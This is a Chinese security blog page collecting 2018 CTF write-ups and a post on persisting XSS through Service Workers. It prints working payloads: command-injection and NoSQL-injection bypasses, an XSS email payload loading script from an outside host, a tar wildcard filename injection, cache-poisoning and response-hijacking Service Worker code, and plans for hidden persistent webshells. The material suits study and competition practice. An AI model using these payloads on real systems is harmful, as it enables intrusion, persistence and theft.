<p>至于绕过后缀名，这两天做工程实践的时候恰好用到了p师傅关于apache的x0a后缀解析为php的文件上传绕过，具体思路：<a href="https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715</a><br><img src="https://s1.ax1x.com/2018/12/24/F6bE11.png" alt></p>
<p>poc如下<br><img src="https://s1.ax1x.com/2018/12/24/F6b97F.png" alt></p>
<h1 id="php-limit"><a href="#php-limit" class="headerlink" title="php limit"></a>php limit</h1><p>这道题依然简单粗暴，代码如下</p>
<pre><code>&lt;?php
if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) {    
    eval($_GET[&#39;code&#39;]);
} else {
    show_source(__FILE__);
}</code></pre><p>刚开始不清楚正则里(?R)的用法，看了别人的WP才知道这是PCRE的正则递归。在这道题里，就是按照递归的方式一直匹配<code>/[^\W]+\((?R)?\)/</code>，看下面这个例子<br><img src="https://i.loli.net/2019/01/08/5c3412a2631a6.jpg" alt></p>
<p>在匹配完b()之后，由于匹配不到[^\W]，正则就停止了。所以这里的代码执行点就是：嵌套函数且最后一个函数不能用参数值</p>
<p>有的师傅们用了get_defined_vars()获取http请求头。其实这个之前在打awd时上流量监控部分用到过，appache可以用getallheaders()来获取http头，但是nginx没有这个函数，可以用了get_defined_vars()，通过current()、next()进而选择可控参数,poc如下</p>
<p><img src="https://i.loli.net/2019/01/08/5c3413c0a9be1.png" alt></p>
<h1 id="Nodejs魔法"><a href="#Nodejs魔法" class="headerlink" title="Nodejs魔法"></a>Nodejs魔法</h1><p>Koa框架写的登陆页面，入库的语句都写出来了<br><img src="https://i.loli.net/2018/12/02/5c033d7cc5c7a.png" alt></p>
<p>看到这一步很关键，因为忘了看flag在哪个表里，后面浪费了很多时间</p>
<p>继续看到登陆的逻辑<br><img src="https://i.loli.net/2018/12/02/5c033d7ce1b2e.png" alt><br>传入的username&amp;&amp;password非空，并且经过safe函数过滤后带入查询，如果有结果则设定session为查询结果</p>
<p>##分析<br>一开始绕safe就饶了好久,尝试了各种注释。最后l0cal师傅提醒，在js里toUpperCase()是可以用拉丁文的unicode绕过的，例如<code>&quot;ſ&quot;.toUpperCase()&lt;=&gt;&quot;S&quot;</code>和<code>&quot;ı&quot;.toUpperCase()&lt;=&gt;&quot;I&quot;</code></p>
<p>那么select 和 union 都可以绕过</p>
<p>一开始想多了,一直在盲注,根据时候有session判断查询的真假，结果好多东西都绕不过去，而且没看代码还在傻乎乎的测表名，十分愚蠢</p>
<p>有好多语句都会500，估计是云服务做了限制。。到最后发现把用户名和密码置空，后面用union查询flag，那设置的session不就是flag么。。</p>
<p>真的是太菜了</p>

                
            </div>
            <div class="continue">
            <a href="/2018/12/21/Code-Breaking-Puzzles WriteUp/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/12/20/SWPUCTF2018 Write up/"> 
                    SWPUCTF2018 Write up 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-12-20   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
            </div>
            <div class="content">
                
                <p>恰逢复习期，也没什么事，打一场SWPUCTF来放松一下，感谢西油出题师傅。最后狗了个第十二名，顺便吐槽一下队友起的什么智障名字。。<br><img src="https://i.loli.net/2018/12/20/5c1b02a394512.png" alt></p>
<h1 id="SWPUCTF2018"><a href="#SWPUCTF2018" class="headerlink" title="SWPUCTF2018"></a>SWPUCTF2018</h1><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="PCAP"><a href="#PCAP" class="headerlink" title="PCAP"></a>PCAP</h2><p>签到题，流量包拖wireshark追TCP包</p>
<h2 id="床前明月光-低头…"><a href="#床前明月光-低头…" class="headerlink" title="床前明月光,低头…"></a>床前明月光,低头…</h2><p>低头看键盘</p>
<pre><code>99 9 9 88 11 5 5 66 3 88 3 6 555 9 11 4 33</code></pre><p>键盘密码 99就代表9那列的第二个值</p>
<p>look ….. 依次读就行了</p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="用优惠码买个X"><a href="#用优惠码买个X" class="headerlink" title="用优惠码买个X"></a>用优惠码买个X</h2><p>拿到题目扫目录 <a href="http://www.zip" target="_blank" rel="noopener">www.zip</a><br>源码如下</p>
<pre><code>$_SESSION[&#39;seed&#39;]=rand(0,999999999);
function youhuima(){
    mt_srand($_SESSION[&#39;seed&#39;]);
    $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
    $auth=&#39;&#39;;
    $len=15;
    for ( $i = 0; $i &lt; $len; $i++ ){
        if($i&lt;=($len/2))
              $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1);
        else
              $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1);
    }
    setcookie(&#39;Auth&#39;, $auth);
}
//support
    if (preg_match(&quot;/^\d+\.\d+\.\d+\.\d+$/im&quot;,$ip)){
        if (!preg_match(&quot;/\?|flag|}|cat|echo|\*/i&quot;,$ip)){
               //执行命令
        }else {
              //flag字段和某些字符被过滤!
        }
    }else{
             // 你的输入不正确!
    }
?&gt;</code></pre><p>根据提示应该分两部分  绕过优惠码-&gt;命令执行逃过</p>
<p>首先说破解优惠码，登陆时session产生0-99999999随机数为种子，通过mt_srand()种下随机数种子，mt_rand()来获取这个随机数。</p>
<p>这里mt_srand伪随机，具体机制可以看这篇文章：<a href="http://wonderkun.cc/index.html/?p=585%EF%BC%8C%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B9%8B%E5%89%8D%E4%B9%9F%E6%98%AFctf%E7%9A%84%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BF" target="_blank" rel="noopener">http://wonderkun.cc/index.html/?p=585%EF%BC%8C%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B9%8B%E5%89%8D%E4%B9%9F%E6%98%AFctf%E7%9A%84%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BF</a></p>
<p>种子不变，生成的随机数就不变</p>
<p>所以通过前15位随机数，破解种子，根据种子再生成24位的随机数，也就是我们的优惠码</p>
<p>脚本跑随机数在字符串的位置：</p>
<pre><code>&lt;?php
$str = &quot;lP9DUJjQ&quot;;
$randStr = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;

for($i=0;$i&lt;strlen($str);$i++){
   $pos = strpos($randStr,$str[$i]);
   echo $pos.&quot; &quot;.$pos.&quot; &quot;.&quot;0 &quot;.(strlen($randStr)-1).&quot; &quot;;
   //整理成方便 php_mt_seed 测试的格式
  //php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]
}
echo &quot;\n&quot;;
?&gt;</code></pre><p>这个的坑点，必须跑前八位优惠码，因为算法里后起位和前八位生成顺序不一样</p>
<p>用工具php_mt_seed跑一下<br><img src="https://i.loli.net/2018/12/20/5c1af5f2cb05b.png" alt></p>
<p>本地php7环境跑这个种子的24位就能得到优惠码了</p>
<p>优惠码成功跳转到命令执行whois查询，匹配ip时用了/m  且^ $必须匹配头尾，%0a换行绕过检测，0a后面写规范ip</p>
<p>过滤了查询flag的语句，用”” 或者\绕过都行</p>
<p>完整payload:</p>
<pre><code>ca\t /f\lag%0a127.0.0.1</code></pre><h2 id="Injection"><a href="#Injection" class="headerlink" title="Injection ???"></a>Injection ???</h2><p>扫目录用个info.php</p>
<p>是个phpinfo然后拓展显示mongo的数据库，搭配题目叫注入，那应该是一个nosql注入了</p>
<p>思路很简单，用通配符猜解admin的密码</p>
<pre><code>username=admin&amp;password[$regex]=^**</code></pre><p>只不过要写个脚本跑验证码，这里队友写了一个提供参考</p>
<pre><code>import requests
import time
import pytesseract
from PIL import Image
import os
from urllib.request import urlretrieve

j=0
passw0rd = [&quot;s&quot;,&quot;k&quot;,&quot;m&quot;,&quot;u&quot;,&quot;n&quot;]
payload=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_!@#$%&quot;
url = &quot;http://123.206.213.66:45678/check.php?username=admin&amp;password[$regex]=^skmun{}&amp;vertify={}&quot;
img_url = &#39;http://123.206.213.66:45678/vertify.php&#39;

for i in range(1,20):
    while j&lt;len(payload):
        s = requests.session()
        payloads = payload[j]
        with open(r&#39;C:\Users\asus\Desktop\image\img1.png&#39;,&#39;wb&#39;) as fd:
            img_1 = s.get(url=img_url)
            fd.write(img_1.content)
        image = Image.open(r&#39;C:\Users\asus\Desktop\image\img1.png&#39;)
        vcode = pytesseract.image_to_string(image)
        url_1 = url.format(str(payloads),vcode)
        r = s.get(url_1,cookies=img_1.cookies)
        print(r.text)
        if &quot;wrong CAPTCHA!&quot; in r.text:
            continue
        if &quot;username or password incorrect!&quot; in r.text:
            print(payloads)
            j = j+1
            break
        if &quot;Nice!But it is not the real passwd&quot; in r.text:
            passw0rd.append(payloads)
            print(&quot;passw0rd is :&quot; + str(passw0rd))
            j = j+1
            break</code></pre><h2 id="SimplePHP"><a href="#SimplePHP" class="headerlink" title="SimplePHP"></a>SimplePHP</h2><p>题目地址：</p>
<p>file有个代码高亮的功能，把这些页面的额源码都Down一下</p>
<p>先看一下test类的__get()方法<br><img src="https://i.loli.net/2019/01/17/5c4024d7a5bbf.png" alt><br><img src="https://i.loli.net/2019/01/17/5c4024d7a663a.png" alt></p>
<p>__get()方法用于输出一个不可访问变量的值，<strong>不可访问不仅仅是protected和private，还有不存在的变量也属于不可访问，这点很重要</strong>。$key的值就是不可访问的参数名，这里是”source”，如果输入”xx”，echo的就是xx。</p>
<p>开发角度来讲，私有属性一般都会调用__get()方法用以提供外界访问。继续看下面的代码</p>
<pre><code>    public function get($key)
    {
        if(isset($this-&gt;params[$key])) {
            $value = $this-&gt;params[$key];      
        } else {
            $value = &quot;index.php&quot;;
        }
        return $this-&gt;file_get($value);  
    }
    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }</code></pre><p>通过调用get()方法获取params数组里的值，进而获取这个值所对应的文件内容，这为获取flag文件内容做了铺垫。</p>
<p>所以只需要想办法使$this-&gt;params[$key] =  ‘/var/www/html/f1ag.php’</p>
<h3 id="瓶颈"><a href="#瓶颈" class="headerlink" title="瓶颈"></a>瓶颈</h3><p>一开始我是这样构造的攻击链：<br><img src="https://i.loli.net/2018/12/20/5c1b0f967a20a.png" alt></p>
<p>之前分析过phar，它在反序列化的时候不会执行构造函数即construct，所以置空参数，让test类的get方法返回文件内容，再通过c1e4r类的echo输出到页面上</p>
<p>但是这里有一个问题，phar序列化的时候， 不会把类的方法反序列化，所以只能控类的成员。那么就开始下面的方法：</p>
<h3 id="正确的思路"><a href="#正确的思路" class="headerlink" title="正确的思路"></a>正确的思路</h3><pre><code>$a = new Test();
$a-&gt;params = [
    &#39;source&#39; =&gt; &#39;/var/www/html/f1ag.php&#39;
];

$b = new Show();
$b-&gt;str[&#39;str&#39;] = $a;

$c = new C1e4r();
$c-&gt;str = $b;</code></pre><p>思路就是：<br>我们用test类来获取f1ag.php里的内容，返回给$content(Show类)，$content的值再返回给C1e4r类的echo输出</p>
<p>C1e4r调用echo，而echo可以执行toString方法，所以我们让echo的值为我们要控的toString方法对应的类即show类的对象</p>
<h2 id="有趣的邮箱注册"><a href="#有趣的邮箱注册" class="headerlink" title="有趣的邮箱注册"></a>有趣的邮箱注册</h2><p>网站功能很少：提交邮箱地址-&gt;管理审核邮箱</p>
<p>给了hint:</p>
<pre><code>&lt;!--check.php
if($_POST[&#39;email&#39;]) {
$email = $_POST[&#39;email&#39;];
if(!filter_var($email,FILTER_VALIDATE_EMAIL)){
echo &quot;error email, pleduase check your email&quot;;
}else{
echo &quot;等待管理员自动审核&quot;;edit/5c1a5a3a38649f668227c9fd
echo $email;
}
}
?&gt;
--&gt;</code></pre><p>之前有个红日审计项目，关于filter_var()匹配email的漏洞进行了剖析:<a href="https://xz.aliyun.com/t/2501" target="_blank" rel="noopener">https://xz.aliyun.com/t/2501</a></p>
<p>大致就是单引号双引号重叠，用\可以绕过空格，</p>
<p>然后我尝试了一下注入scirpt标签提交..尼玛直接成功了…<br><img src="https://i.loli.net/2018/12/20/5c1af8b853c84.jpg" alt></p>
<pre><code>email=&quot;\ &lt;sCRiPt\ sRC=https://unazizi.exeye.io/swctf&gt;&lt;/sCrIpT&gt;\ &quot;@aa.com</code></pre><p>那它的意思应该是后台管理员会随时点击这个email，就触发了xss</p>
<p>因为打不到管理员的cookie，就打admin.php的页面源码了<br><img src="https://i.loli.net/2018/12/20/5c1af977078cf.jpg" alt></p>
<p>发现后台会跳到：<code>/admin/a0a.php?cmd=whoami</code></p>
<p>明显RCE，直接请求到这个url，发现出题人设置了本地，且匹配IP用的是 remote_addr，也就是说无法伪装IP</p>
<p>后台Bot一直会请求admin.php这个页面，xss 改变它请求的参数，让本地管理员帮我们执行这个命令</p>
<p>用XHR发送请求或者Location重定向都可以</p>
<p>反弹Shell后发现还有题目，后台有个上传页面和备份页面，其中backup.php可读内容如下</p>
<pre><code>&lt;?phpinclude(&quot;upload.php&quot;);
echo &quot;上传目录：&quot; . $upload_dir . &quot;&lt;br /&gt;&quot;;
$sys = &quot;tar -czf z.tar.gz *&quot;;
chdir($upload_dir);
system($sys);
if(file_exists(&#39;z.tar.gz&#39;)){
        echo &quot;上传目录下的所有文件备份成功!&lt;br /&gt;&quot;;
        echo &quot;备份文件名: z.tar.gz&quot;;
}else{
        echo &quot;未上传文件，无法备份！&quot;;
}
?&gt;</code></pre><p>也就是说它会备份我们上传目录下的所有文件，即*</p>
<p>上传一些文件名例如<code>| echo &quot;123&quot;&gt;123.php</code></p>
<p>System 就会执行拼接后的$sys</p>
<p>当时题目坏了，出题师傅跟我说直接再弹一个shell，就可以拿到flag权限。。</p>
<p>然后直接给我了flag…2333…</p>
<h1 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h1><p>这次比赛是西南石油师傅举办的公益性比赛..觉得他们确实挺不容易的，学院不支持+自掏腰包办比赛，但是赛题质量都还不错，可见师傅们的用心，给个好评！</p>

                
            </div>
            <div class="continue">
            <a href="/2018/12/20/SWPUCTF2018 Write up/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/12/17/HCTF2018线下赛感想/"> 
                    HCTF2018线下赛感想 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-12-17   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/博客文章/">博客文章</a></li></ul>
            </div>
            <div class="content">
                
                <p>跑去丢了一趟人，实在是对不起各位师傅</p>
<h1 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h1><p>比赛期恰逢考试期，几天一共就睡了几个小时，无论从体力或是经验都输的一塌糊涂。</p>
<p>这次比赛也算是给自己个教训，<strong>准备不充分</strong>，就把之前备好的流量成功监控了，其余的东西几乎没用</p>
<p>比赛开始配置网络用了挺长时间的，导致登上ssh以后就已经被别人上马了。</p>
<p>其实这是很吃亏的事：第一，你无法及时备份原始的目录，这就有一个很严重的后果，如果后来一不小心恢复了留有马子的备份一切功亏一篑，更严重的是，如果你的一些服务被恶意删了，那开局就直接崩盘。</p>
<p>第二，在你杀别人后门的时候，别人可能就已经打了你一轮，甚至可能会种新的马。而且杀后门的时间又占用了补洞的时间..新一轮的马子又会上来…</p>
<p>所以上线一定要快，备份打的一定要快！</p>
<p>教训就是，一定要在本地补好洞了，再传到机器上，宁可被打，也要修好自己的服务，被打总比down掉了好。这次吃了很大的亏，全场被check。</p>
<p>所以，不要随便就删漏洞点，有时候漏洞点也是功能点。补洞不代表无脑卡权限，这次include的文件包含洞就可以换成file_get_contents来补。<strong>最重要的事，不要随便就把目录555了</strong>，如果Check点是上传和下载功能就凉了</p>
<p>关于防御，<strong>一定要给自己留一个可用的后门</strong>,www-data权限一定得有一个，否则php进程可能都杀不掉</p>
<h1 id="这次比赛后要准备的东西"><a href="#这次比赛后要准备的东西" class="headerlink" title="这次比赛后要准备的东西"></a>这次比赛后要准备的东西</h1><p>吃足了教训：<strong>手动上马是非常愚蠢的行为</strong></p>
<h2 id="内置后门批量上马"><a href="#内置后门批量上马" class="headerlink" title="内置后门批量上马"></a>内置后门批量上马</h2><p>蓝莲花的moxiaoxi师傅的脚本思路大致是这样的：</p>
<p>内置后门(能执行system函数)，通过散列生成随机名字的隐藏不死马+守护进程维护不死马+软连接来隐藏真实的请求</p>
<p>最近要完成这个脚本</p>
<h2 id="心态"><a href="#心态" class="headerlink" title="心态"></a>心态</h2><p>心态真的是很重要，不要因为被打就慌张，找到洞点，补好了再上服务，切忌慌里慌张。</p>
<p>这次就算是交学费了，自闭</p>

                
            </div>
            <div class="continue">
            <a href="/2018/12/17/HCTF2018线下赛感想/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/11/14/RootkitXSS֮ServiceWorker/"> 
                    RootkitXSS之ServiceWorker 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-11-14   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS测试/">XSS测试</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="RootkitXSS之ServiceWorker"><a href="#RootkitXSS之ServiceWorker" class="headerlink" title="RootkitXSS之ServiceWorker"></a>RootkitXSS之ServiceWorker</h1><p>文章首发于先知：<a href="https://xz.aliyun.com/t/3228#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/3228#toc-10</a></p>
<p>在拿到一个可以XSS点的时候后，持久化成为一种问题。这几天跟师傅们接触到RootkiXss的一些姿势，受益匪浅</p>
<h2 id="Serviceworker定义"><a href="#Serviceworker定义" class="headerlink" title="Serviceworker定义"></a>Serviceworker定义</h2><p>Service workers(后文称SW) 本质上充当Web应用程序与浏览器之间的代理服务器，也可以在网络可用时作为浏览器和网络间的代理。它们旨在（除其他之外）使得能够创建有效的离线体验，拦截网络请求并基于网络是否可用以及更新的资源是否驻留在服务器上来采取适当的动作。他们还允许访问推送通知和后台同步API。</p>
<p>也就是说SW 提供了一组API，能够拦截当前站点产生HTTP请求，还能控制返回结果。因此，SW 拦住请求后，使用 Cache Storage 里的内容进行返回，就可以实现离线缓存的功能。当Cache Storage不存在请求的资源时再向服务器请求,cache.put可以选择性地将请求资源加载到cache storage中。如果不手动取消已经注册过的sw服务,刷新/重新打开页面都会启动站点的sw服务，这为我们持久化XSS提供了一定的条件。</p>
<h3 id="查看SW服务"><a href="#查看SW服务" class="headerlink" title="查看SW服务"></a>查看SW服务</h3><p>Chrome地址栏访问 chrome://serviceworker-internals/，就可以看见已有的后台服务。</p>
<h2 id="注册serviceworker"><a href="#注册serviceworker" class="headerlink" title="注册serviceworker"></a>注册serviceworker</h2><p>注册点js代码</p>
<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
    var url=&quot;//localhost/serviceworker.js&quot;;
    if (&#39;serviceWorker&#39; in navigator) {
 navigator.serviceWorker.register(url)
 .then(function(registration) {
 console.log(&#39;ServiceWorker registration successful with scope: &#39;, registration.scope);
 })
};
&lt;/script&gt;
normal visit</code></pre><p>script标签下的type必须指明为<code>text/javascript</code></p>
<h3 id="event-request-clone"><a href="#event-request-clone" class="headerlink" title="event.request.clone()"></a>event.request.clone()</h3><p>对象的内容如图<br><img src="https://i.loli.net/2018/11/03/5bdd0e7b665f4.png" alt></p>
<h2 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h2><h3 id="一个可以XSS的点"><a href="#一个可以XSS的点" class="headerlink" title="一个可以XSS的点"></a>一个可以XSS的点</h3><h3 id="sw文件可控"><a href="#sw文件可控" class="headerlink" title="sw文件可控"></a>sw文件可控</h3><p>如果说sw可以放在同源下,也就是js文件可控的话。直接注册Sw，代码如下：</p>
<pre><code>// 拦截特定的Url，如果请求是对应的Url，则返回攻击的response
self.addEventListener(&#39;fetch&#39;, function (event) {  
    var url = event.request.clone(); 
    body = &#39;&lt;script&gt;alert(&quot;test&quot;)&lt;/script&gt;&#39;;
    init = {headers: { &#39;Content-Type&#39;: &#39;text/html&#39; }};
    if(url.url==&#39;http://localhost/reurl.html&#39;){
        res  = new Response(body,init);
        event.respondWith(res.clone());
    }
});</code></pre><h3 id="jsonp回调接口"><a href="#jsonp回调接口" class="headerlink" title="jsonp回调接口"></a>jsonp回调接口</h3><p>利用储值型X点写入下面的代码</p>
<p>当JSONP接口存在缺陷时，比如没有校验回调名。导致返回内容可控<br>比如：url?callback=importScript(…)<br>返回<code>importScript(...)</code><br>代码实现如下：</p>
<pre><code>&lt;?php
// JSONP 回调名缺少校验
$cb_name = $_GET[&#39;callback&#39;];
$cb_data = time();

header(&#39;Content-Type: application/javascript&#39;);
echo(&quot;$cb_name($cb_data)&quot;);</code></pre><p>attack_js</p>
<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
    var url=&quot;//localhost/getdata?callback=importScripts(&#39;//third.com/sw.js?g&#39;)&quot;;
    if (&#39;serviceWorker&#39; in navigator) {
 navigator.serviceWorker.register(url)
 .then(function(registration) {
 console.log(&#39;ServiceWorker registration successful with scope: &#39;, registration.scope);
 })
};
&lt;/script&gt;</code></pre><p>这里面callback回调的事件就相当于sw脚本。当js被执行之后会注册一个sw脚本,内容是回调的事件<br><img src="https://i.loli.net/2018/11/05/5be04f7b70f25.png" alt><br><img src="https://i.loli.net/2018/11/05/5be04f9d988ca.png" alt></p>
<p>或者鸡肋上传一个html到网站下</p>
<pre><code>&lt;html&gt;
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot; /&gt; 
&lt;body&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
    var url=&quot;//localhost/getdata?callback=importScripts(&#39;//third.com/sw.js?g&#39;)&quot;;
    if (&#39;serviceWorker&#39; in navigator) {
 navigator.serviceWorker.register(url)
 .then(function(registration) {
 console.log(&#39;ServiceWorker registration successful with scope: &#39;, registration.scope);
 })
};
&lt;/script&gt;
it&#39;s nothing
&lt;/body&gt;
&lt;/html&gt;</code></pre><h2 id="局限"><a href="#局限" class="headerlink" title="局限"></a>局限</h2><ul>
<li>存在有缺陷的 JSONP 接口</li>
<li>JSONP 的目录尽可能浅（最好在根目录下），如果放在域的根目录下，将会收到这个域下的所有fetch事件</li>
<li>JSONP 返回的 Content-Type 必须是 JS 类型</li>
<li>存在 XSS 的页面</li>
</ul>
<p>在网上看到一个师傅这样作例,引用一下：<br>service worker文件被放在这个域的根目录下，这意味着service worker和网站同源。换句话说，这个service work将会收到这个域下的所有fetch事件。如果我将service worker文件注册为/example/sw.js，那么，service worker只能收到/example/路径下的fetch事件（例如： /example/page1/, /example/page2/）</p>
<h2 id="Cache缓存污染"><a href="#Cache缓存污染" class="headerlink" title="Cache缓存污染"></a>Cache缓存污染</h2><p>前文的攻击不涉及cache里的资源,进行的是协商缓存，下面说一下强缓存的利用。</p>
<h2 id="请求资源"><a href="#请求资源" class="headerlink" title="请求资源"></a>请求资源</h2><p>如果使用cache.put方法，则请求的资源成功后会存在Cache Storage里。如果fetch里写了caches.match(event.request)方法，则每次请求时会先从caches找缓存来优先返回给请求页面。若没有缓存，再进行新的缓存操作。</p>
<p>下面是一个缓存读取/判断的demo</p>
<pre><code>// 拦截特定的Url，如果请求是对应的Url，则返回攻击的response。否则用Fetch请求网络上原本的url，进行本地缓存(为了不影响正常功能))
self.addEventListener(&#39;fetch&#39;, function (event) {  
        event.respondWith(
            //console.log(event.request)
        caches.match(event.request).then(function(res){
        if(res){//如果有缓存则使用缓存
        return res;
        }
        return requestBackend(event);//没缓存就进行缓存
        })
        )
   });

function requestBackend(event){  
        var url = event.request.clone();  
        console.log(url)  //打印内容是打印到请求页面
        if(url.url==&#39;http://localhost/reurl.html&#39;){//判断是否为需要劫持的资源

        return new Response(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;, {headers: { &#39;Content-Type&#39;: &#39;text/html&#39; }})
        }
        return fetch(url).then(function(res){
        //检测是否为有效响应
        if(!res || res.status !== 200 || res.type !== &#39;basic&#39;){
        return res;
        }
        var response = res.clone();
        caches.open(&#39;v1&#39;).then(function(cache){  //打开v1缓存进行存储
        cache.put(event.request, response);
        });

        return res;
        })
}</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>前几天看ED师傅的研究,发现这种好玩但是鸡肋的方法。上面提到cache.put的方法把js资源添加到Cache Storage，其实如果我们用cache.put把恶意代码插入,覆盖原始的js数据。后果就是当sw请求cahce里的资源时会执行恶意代码。比如workbox会先从缓存读取静态资源,我们用异步请求将恶意代码无限覆盖这个缓存时：</p>
<p>控制台输入下面的恶意代码</p>
<pre><code>async function replay() {
    const name = &#39;xx&#39;
    const url = &#39;xx&#39;
    const payload = `
alert(1);
`
    let cache = await caches.open(name);
    let req = new Request(url);
    let res = new Response(payload + replay + &#39;;replay()&#39;);   //执行alert+写入cache内容+执行fn
    setInterval(_ =&gt; {
      cache.put(req, res.clone());
    }, 500);
}
replay();</code></pre><p>就可以在cache Storage里看到500ms刷新并覆盖一次的js资源。<br><img src="https://i.loli.net/2018/11/05/5be0502e0dd09.png" alt></p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>Service Worker API(<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API</a>)</p>
<p>浏览器缓存知识(<a href="https://www.cnblogs.com/lyzg/p/5125934.html" target="_blank" rel="noopener">https://www.cnblogs.com/lyzg/p/5125934.html</a>)</p>

                
            </div>
            <div class="continue">
            <a href="/2018/11/14/RootkitXSS֮ServiceWorker/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/11/13/HCTF题解/"> 
                    HCTF2018线上赛部分WriteUp 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-11-13   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="HCTF题解"><a href="#HCTF题解" class="headerlink" title="HCTF题解"></a>HCTF题解</h1><h1 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>提示只有admin才能查看</p>
<p>注册账号功能，发现注册大写和小写会提示重名注册。<br>也就是说 ADMIN&lt;=&gt;admin</p>
<p>有一篇文章将Unicode安全，提到的一个python函数canonical_username，这个函数会把类似的unicode字符做一个与chrome的地址栏里相似的转换，举个例子<br>BIG会被转换为big。ᴬᴬᴬ，经过函数处理<br>后变成了AAA</p>
<ol>
<li>我们注册形似ADMIN的名字</li>
<li>后台函数处理把形似ADMIN转换为ADMIN</li>
<li>修改ADMIN的密码，相当于修改admin的密码</li>
<li>登陆admin获得flag</li>
</ol>
<p>相当于一个越权</p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>Unicode安全：<a href="http://blog.lnyas.xyz/?p=1411" target="_blank" rel="noopener">http://blog.lnyas.xyz/?p=1411</a><br>Unicode近似字合集:<a href="https://www.compart.com/en/unicode/category/Lm" target="_blank" rel="noopener">https://www.compart.com/en/unicode/category/Lm</a></p>
<h1 id="kznoe"><a href="#kznoe" class="headerlink" title="kznoe"></a>kznoe</h1><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>拿到题目发现砝码泄露,down了一份<a href="http://www.zip开始审" target="_blank" rel="noopener">www.zip开始审</a></p>
<p>一眼看到sql文件，打开看看执行了哪些语句，发现后台账号密码</p>
<pre><code>INSERT INTO `fish_admin` (`id`, `username`, `password`, `name`, `qq`, `per`) VALUES
(1, &#39;admin&#39;, &#39;21232f297a57a5a743894a0e4a801fc3&#39;, &#39;小杰&#39;, &#39;1503816935&#39;, 1);</code></pre><p>登陆失败，被改了密码，开始审计</p>
<h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><p>整个钓鱼网站的大致结构：<br><img src="https://i.loli.net/2018/11/13/5beac350d6b8e.png" alt><br>根目录index.php跳转页</p>
